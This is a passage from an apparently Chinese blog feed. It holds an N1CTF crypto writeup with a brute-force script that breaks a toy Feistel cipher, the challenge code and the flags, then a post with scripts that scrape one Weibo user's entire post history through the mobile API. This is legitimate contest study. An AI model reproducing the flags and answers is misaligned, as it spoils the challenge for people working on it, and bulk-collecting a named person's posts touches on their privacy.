time.asctime()</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> (i-start)%<span class="number">10</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> start,time.asctime(),<span class="string">"#"</span></span><br><span class="line">handle1(<span class="number">2</span>**<span class="number">16</span>,<span class="number">2</span>**<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p><del>受他启发，我有了个基于<code>outbit==(x2==1?x1:x3)</code> 爆破的想法，但看起来也不可操作。</del></p><p><del>投入太多时间了，还是等官方WP吧：）</del></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>N1CTF baby_N1ES writeup</title>
      <link href="/180310N1CTFWP/"/>
      <url>/180310N1CTFWP/</url>
      
        <content type="html"><![CDATA[<h2 id="baby-N1ES"><a href="#baby-N1ES" class="headerlink" title="baby_N1ES"></a>baby_N1ES</h2><p>题目提供两个文件，<code>challenge.py</code>和<code>N1ES.py</code> 。</p><p>虽然似乎在模仿AES，但是实际上明文和密文是一一映射的，复杂度不是恶心的<code>100^48</code> 而只是<code>100*48</code> ，穷举是很快的。一个小障碍是<code>N1ES.py</code> 第71行的<code>L, R = R, L</code> ，这导致了明文的<code>[0:8]</code> 、<code>[8:16]</code>、<code>[16:24]</code>、<code>[24:32]</code>、<code>[32:40]</code>、<code>[40:48]</code> 分别对应的是密文的<code>[8:16]</code>、<code>[0:8]</code> 、<code>[24:32]</code>、<code>[16:24]</code>、<code>[40:48]</code>、 <code>[32:40]</code> ，写穷举脚本时需要注意。</p><h3 id="crack-py"><a href="#crack-py" class="headerlink" title="crack.py"></a>crack.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,string,N1ES</span><br><span class="line">key = <span class="string">"wxy191iss00000000000cute"</span></span><br><span class="line">c = base64.b64decode(<span class="string">"HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx"</span>)</span><br><span class="line">n1es = N1ES.N1ES(key)</span><br><span class="line">f=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> string.printable:</span><br><span class="line">s=<span class="string">"x"</span>*i*<span class="number">16</span>+<span class="string">"x"</span>*j+k+<span class="string">"x"</span>*(<span class="number">48</span>-i*<span class="number">16</span>-j<span class="number">-1</span>)</span><br><span class="line">e=n1es.encrypt(s)</span><br><span class="line">check=c[i*<span class="number">16</span>+j+<span class="number">8</span>]==e[i*<span class="number">16</span>+j+<span class="number">8</span>] <span class="keyword">if</span> j&lt;<span class="number">8</span> <span class="keyword">else</span> c[i*<span class="number">16</span>+j<span class="number">-8</span>]==e[i*<span class="number">16</span>+j<span class="number">-8</span>]</span><br><span class="line"><span class="keyword">if</span> check:</span><br><span class="line">f+=k</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> f</span><br><span class="line"><span class="comment"># N1CTF&#123;F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/&#125;</span></span><br></pre></td></tr></table></figure><h3 id="challenge-py"><a href="#challenge-py" class="headerlink" title="challenge.py"></a>challenge.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> N1ES <span class="keyword">import</span> N1ES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"wxy191iss00000000000cute"</span></span><br><span class="line">n1es = N1ES(key)</span><br><span class="line">flag = <span class="string">"N1CTF&#123;*****************************************&#125;"</span></span><br><span class="line">cipher = n1es.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> base64.b64encode(cipher)  <span class="comment"># HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx</span></span><br></pre></td></tr></table></figure><h3 id="N1ES-py"><a href="#N1ES-py" class="headerlink" title="N1ES.py"></a>N1ES.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round_add</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    f = <span class="keyword">lambda</span> x, y: x + y - <span class="number">2</span> * (x &amp; y)</span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        res += chr(f(ord(a[i]), ord(b[i])))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutate</span><span class="params">(table, block)</span>:</span></span><br><span class="line"><span class="keyword">return</span> list(map(<span class="keyword">lambda</span> x: block[x], table))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string_to_bits</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">    l = len(data) * <span class="number">8</span></span><br><span class="line">    result = [<span class="number">0</span>] * l</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">            result[(pos&lt;&lt;<span class="number">3</span>)+i] = (ch&gt;&gt;i) &amp; <span class="number">1</span></span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">s_box = [<span class="number">54</span>, <span class="number">132</span>, <span class="number">138</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">73</span>, <span class="number">187</span>, <span class="number">84</span>, <span class="number">146</span>, <span class="number">30</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">148</span>, <span class="number">63</span>, <span class="number">65</span>, <span class="number">189</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">72</span>, <span class="number">161</span>, <span class="number">116</span>, <span class="number">63</span>, <span class="number">161</span>, <span class="number">91</span>, <span class="number">37</span>, <span class="number">24</span>, <span class="number">126</span>, <span class="number">107</span>, <span class="number">87</span>, <span class="number">30</span>, <span class="number">117</span>, <span class="number">185</span>, <span class="number">98</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">140</span>, <span class="number">70</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">150</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">144</span>, <span class="number">153</span>, <span class="number">36</span>, <span class="number">90</span>, <span class="number">149</span>, <span class="number">54</span>, <span class="number">156</span>, <span class="number">8</span>, <span class="number">59</span>, <span class="number">40</span>, <span class="number">110</span>, <span class="number">56</span>,<span class="number">1</span>, <span class="number">84</span>, <span class="number">103</span>, <span class="number">22</span>, <span class="number">65</span>, <span class="number">17</span>, <span class="number">190</span>, <span class="number">41</span>, <span class="number">99</span>, <span class="number">151</span>, <span class="number">119</span>, <span class="number">124</span>, <span class="number">68</span>, <span class="number">17</span>, <span class="number">166</span>, <span class="number">125</span>, <span class="number">95</span>, <span class="number">65</span>, <span class="number">105</span>, <span class="number">133</span>, <span class="number">49</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">29</span>, <span class="number">110</span>, <span class="number">7</span>, <span class="number">81</span>, <span class="number">134</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">180</span>, <span class="number">78</span>, <span class="number">175</span>, <span class="number">108</span>, <span class="number">26</span>, <span class="number">121</span>, <span class="number">74</span>, <span class="number">29</span>, <span class="number">68</span>, <span class="number">162</span>, <span class="number">142</span>, <span class="number">177</span>, <span class="number">143</span>, <span class="number">86</span>, <span class="number">129</span>, <span class="number">101</span>, <span class="number">117</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">34</span>, <span class="number">177</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">74</span>, <span class="number">69</span>, <span class="number">147</span>, <span class="number">90</span>, <span class="number">49</span>, <span class="number">135</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">19</span>, <span class="number">89</span>, <span class="number">38</span>, <span class="number">21</span>, <span class="number">41</span>, <span class="number">17</span>, <span class="number">155</span>, <span class="number">83</span>, <span class="number">38</span>, <span class="number">159</span>, <span class="number">179</span>, <span class="number">19</span>, <span class="number">157</span>, <span class="number">68</span>, <span class="number">105</span>, <span class="number">151</span>, <span class="number">166</span>, <span class="number">171</span>, <span class="number">122</span>, <span class="number">179</span>, <span class="number">114</span>, <span class="number">52</span>, <span class="number">183</span>, <span class="number">89</span>, <span class="number">107</span>, <span class="number">113</span>, <span class="number">65</span>, <span class="number">161</span>, <span class="number">141</span>, <span class="number">18</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">81</span>, <span class="number">156</span>, <span class="number">17</span>, <span class="number">190</span>, <span class="number">38</span>, <span class="number">84</span>, <span class="number">9</span>, <span class="number">171</span>, <span class="number">180</span>, <span class="number">59</span>, <span class="number">45</span>, <span class="number">15</span>, <span class="number">34</span>, <span class="number">89</span>, <span class="number">75</span>, <span class="number">164</span>, <span class="number">190</span>, <span class="number">140</span>, <span class="number">6</span>, <span class="number">41</span>, <span class="number">188</span>, <span class="number">77</span>, <span class="number">165</span>, <span class="number">105</span>, <span class="number">5</span>, <span class="number">107</span>, <span class="number">31</span>, <span class="number">183</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">125</span>, <span class="number">50</span>, <span class="number">2</span>, <span class="number">153</span>, <span class="number">156</span>, <span class="number">162</span>, <span class="number">186</span>, <span class="number">76</span>, <span class="number">158</span>, <span class="number">153</span>, <span class="number">117</span>, <span class="number">9</span>, <span class="number">77</span>, <span class="number">156</span>, <span class="number">11</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">169</span>, <span class="number">52</span>, <span class="number">57</span>, <span class="number">161</span>, <span class="number">7</span>, <span class="number">158</span>, <span class="number">110</span>, <span class="number">191</span>, <span class="number">43</span>, <span class="number">82</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">102</span>, <span class="number">166</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">5</span>, <span class="number">189</span>, <span class="number">27</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(o)</span>:</span></span><br><span class="line">    k = permutate(s_box,o)</span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(k), <span class="number">7</span>):</span><br><span class="line">        b.append(k[i:i+<span class="number">7</span>] + [<span class="number">1</span>])</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> b[i]:</span><br><span class="line">x += (j&lt;&lt;pos)</span><br><span class="line">pos += <span class="number">1</span></span><br><span class="line">c.append((<span class="number">0x10001</span>**x) % (<span class="number">0x7f</span>))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N1ES</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (len(key) != <span class="number">24</span> <span class="keyword">or</span> isinstance(key, bytes) == <span class="keyword">False</span> ):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"key must be 24 bytes long"</span>)</span><br><span class="line">        self.key = key</span><br><span class="line">        self.gen_subkey()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen_subkey</span><span class="params">(self)</span>:</span></span><br><span class="line">        o = string_to_bits(self.key)</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        o = generate(o)</span><br><span class="line">        k.extend(o)</span><br><span class="line">        o = string_to_bits([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> o[<span class="number">0</span>:<span class="number">24</span>]])</span><br><span class="line">        self.Kn = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            self.Kn.append(map(chr, k[i * <span class="number">8</span>: i * <span class="number">8</span> + <span class="number">8</span>]))</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (len(plaintext) % <span class="number">16</span> != <span class="number">0</span> <span class="keyword">or</span> isinstance(plaintext, bytes) == <span class="keyword">False</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"plaintext must be a multiple of 16 in length"</span>)</span><br><span class="line">        res = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext) / <span class="number">16</span>):</span><br><span class="line">            block = plaintext[i * <span class="number">16</span>:(i + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">            L = block[:<span class="number">8</span>]</span><br><span class="line">            R = block[<span class="number">8</span>:]</span><br><span class="line">            <span class="keyword">for</span> round_cnt <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                L, R = R, (round_add(L, self.Kn[round_cnt]))</span><br><span class="line">            L, R = R, L</span><br><span class="line">            res += L + R</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>IRC频道公告有字符串<code>TjFDVEZ7V2VsYzBtZV90b19OMUNURl8yMDE4fQ</code> ,base64解码后即flag。</p><p><img src="checkin.jpg" alt="checkin.jpg"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>收集整理一个人所有的微博</title>
      <link href="/180309RetrieveWeiboPosts/"/>
      <url>/180309RetrieveWeiboPosts/</url>
      
        <content type="html"><![CDATA[<blockquote><p>项目地址在  <a href="https://github.com/findneo/scripts/tree/master/attaches/tk%E6%95%99%E4%B8%BB%E8%AF%AD%E5%BD%95" target="_blank" rel="noopener">Github</a> </p></blockquote><p>人生活在社区里，对一个常使用微博的人来说，微博记录和反映了他在一段时间内所接触的信息，思考的问题和表达的观点，是值得研究的。如果这个研究对象是一个优秀的人，这里面的价值可能比想象要大。</p><p>很显然，要做成<code>收集整理一个人所有的微博</code> 这件事，首先是收集，其次是整理。</p><p>收集主要想到有三种方式：</p><ul><li>找现成工具（无趣，暂不考虑）。</li><li>在<code>https://m.weibo.cn/u/14015127xxx</code> 页面一直按<code>END</code> 键，然后页面会不断异步发送请求以增加页面内容，直到全部内容都被获取。</li><li>可以看到第二种方法中的请求是向<code>https://m.weibo.cn/api/container/getIndex?type=uid&amp;value=1401527xxx&amp;containerid=1076031401527xxx&amp;page=1</code> 发送GET请求，只需迭代page的参数即可得到所有数据。</li></ul><h3 id="方法二实践"><a href="#方法二实践" class="headerlink" title="方法二实践"></a>方法二实践</h3><p>用如下简单脚本模拟按键行为，泡杯茶观察成果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> win32api</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">cnt+=<span class="number">1</span></span><br><span class="line">win32api.keybd_event(<span class="number">35</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="comment">#35 stands for "END" key; 0 means hold down</span></span><br><span class="line"> win32api.keybd_event(<span class="number">35</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>) <span class="comment"># 1 means hold up </span></span><br><span class="line"><span class="keyword">print</span> cnt,</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br></pre></td></tr></table></figure><p>发现按了几十下页面就开始不变化了，观察请求发现都是发给<code>page=50</code>的，想必是做了限制，最多获取50条记录，暂告失败。</p><h3 id="方法三实践"><a href="#方法三实践" class="headerlink" title="方法三实践"></a>方法三实践</h3><p>要用这个方法首先最好知道总共有多少page，用二分法手动测，很快就能发现目标用户共有1542个page的记录，然后写个脚本dump下这些响应，保存成json文件，以供后面处理即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">print</span> asctime()</span><br><span class="line">url=<span class="string">"https://m.weibo.cn/api/container/getIndex?type=uid&amp;value=1401527xxx&amp;containerid=1076031401527xxx&amp;page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1543</span>,<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">u=url+str(i)</span><br><span class="line">f=open(<span class="string">"result/%d.json"</span>%i,<span class="string">'w+'</span>)</span><br><span class="line">f.write(get(u).content)</span><br><span class="line">f.close()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> i%<span class="number">50</span>==<span class="number">0</span>:</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> asctime()</span><br></pre></td></tr></table></figure><h3 id="处理json"><a href="#处理json" class="headerlink" title="处理json"></a>处理json</h3><p>分析响应结构，提取关键信息，构造文件汇总即可。代码见  <a href="https://github.com/findneo/TKposts/blob/master/parse_json.py" target="_blank" rel="noopener">GitHub</a> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment"># Github 项目已删，成果暂存 https://findneo.github.io/p/tkposts.html</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_cards_to_html</span><span class="params">(data_cards)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">微博API</span></span><br><span class="line"><span class="string">(https://m.weibo.cn/api/container/getIndex?type=uid&amp;value=1401527553&amp;containerid=1076031401527553&amp;page=1)</span></span><br><span class="line"><span class="string">返回的一个字典，形如</span></span><br><span class="line"><span class="string">&#123;ok: 1,</span></span><br><span class="line"><span class="string">data: </span></span><br><span class="line"><span class="string">&#123;cardlistInfo: &#123;...&#125;,</span></span><br><span class="line"><span class="string">cards: </span></span><br><span class="line"><span class="string">[&#123;card_type: 9,</span></span><br><span class="line"><span class="string">itemid: foo,</span></span><br><span class="line"><span class="string">scheme: post链接,</span></span><br><span class="line"><span class="string">mblog: &#123;created_at: post发表时间,...,</span></span><br><span class="line"><span class="string">text: post内容,...,</span></span><br><span class="line"><span class="string">retweeted_status: &#123;created_at: repost发表时间,...,text: repost内容,...,&#125;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">show_type: 0</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;...&#125;,...</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">showAppTips: 0,</span></span><br><span class="line"><span class="string">scheme: foo</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">本函数的功能是将cards中每一个表示post的card里的时间和内容，以及repost的时间和内容(如果有的话)，提取出来，</span></span><br><span class="line"><span class="string">构造成HTML语句。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">ret=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> card <span class="keyword">in</span> data_cards:</span><br><span class="line"><span class="keyword">if</span> card[<span class="string">"card_type"</span>]==<span class="number">9</span>: </span><br><span class="line"><span class="comment"># card_type==9 说明当前card是一个post</span></span><br><span class="line">is_repost=<span class="number">0</span></span><br><span class="line">post=card[<span class="string">"mblog"</span>] </span><br><span class="line">post_time=post[<span class="string">"created_at"</span>]</span><br><span class="line">post_text=post[<span class="string">"text"</span>]</span><br><span class="line">ret0=<span class="string">"&lt;p&gt;&lt;code&gt;&lt;br /&gt;%s&lt;/code&gt;&lt;br /&gt;%s&lt;/p&gt;"</span>%(post_time,post_text)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"retweeted_status"</span> <span class="keyword">in</span> post.keys():</span><br><span class="line"><span class="comment"># 当前card中有retweeted_status键说明这是一个repost</span></span><br><span class="line">is_repost=<span class="number">1</span></span><br><span class="line">repost=post[<span class="string">"retweeted_status"</span>]</span><br><span class="line">repost_time=repost[<span class="string">"created_at"</span>]</span><br><span class="line">repost_text=repost[<span class="string">"text"</span>]</span><br><span class="line">ret1=<span class="string">"\n\t&lt;blockquote&gt;&lt;p&gt;&lt;code&gt;%s&lt;/code&gt;&lt;br /&gt;%s&lt;/p&gt;&lt;/blockquote&gt;"</span>%(repost_time,repost_text)</span><br><span class="line">ret=ret+ret0+ret1 <span class="keyword">if</span> is_repost <span class="keyword">else</span> ret+ret0</span><br><span class="line">ret=ret+<span class="string">"&lt;hr /&gt;\n"</span></span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment_img_in_html</span><span class="params">(file_name)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">因为教主post中时有图片，15000+条post里的图片数量相当可观（而且很多加载不出来），</span></span><br><span class="line"><span class="string">为了提高加载速度，这个函数将成品中的img标签全部注释掉。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">with</span> open(file_name) <span class="keyword">as</span> old_f,open(<span class="string">"noimg_%s"</span>%file_name,<span class="string">"w+"</span>) <span class="keyword">as</span> new_f:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> old_f.readlines():</span><br><span class="line">res=re.sub(<span class="string">'(&lt;img.*?&gt;)'</span>,<span class="string">r"&lt;!--\1--&gt;"</span>,line)</span><br><span class="line">new_f.write(res)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"tkposts.html"</span>,<span class="string">"w+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">head=<span class="string">'&lt;html&gt;&lt;head&gt;&lt;style type="text/css"&gt;html&#123;background:#f2f2f2;font-size:16px;font-family:Monaco&#125;&lt;/style&gt;&lt;title&gt;TK POSTS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\n'</span></span><br><span class="line">f.write(head.encode(<span class="string">'utf8'</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">1543</span>):</span><br><span class="line">data = json.load(open(<span class="string">"%d.json"</span>%i))</span><br><span class="line"><span class="keyword">if</span> data[<span class="string">"ok"</span>]!=<span class="number">1</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%d.json no data"</span>%i</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">msg_list=data[<span class="string">"data"</span>][<span class="string">"cards"</span>]</span><br><span class="line">msg_html=parse_cards_to_html(msg_list)</span><br><span class="line">f.write(msg_html.encode(<span class="string">'utf8'</span>))</span><br><span class="line">tail=<span class="string">"&lt;/body&gt;&lt;/html&gt;"</span></span><br><span class="line">f.write(tail.encode(<span class="string">'utf8'</span>))</span><br><span class="line">comment_img_in_html(<span class="string">"tkposts.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">截至 2018/3/8 下午一时许，教主在新浪微博上共发表约13831条状态，</span></span><br><span class="line"><span class="string">其中约6157条是转发自己或其他人的状态并评论。</span></span><br><span class="line"><span class="string">第一条发布在2010-05-21，内容是</span></span><br><span class="line"><span class="string">“刚看到的：2007年德国《自然科学》杂志的一篇文章指出，</span></span><br><span class="line"><span class="string">最近感染过弓形虫的女性怀孕生男孩的概率为60.8%。也就是说，</span></span><br><span class="line"><span 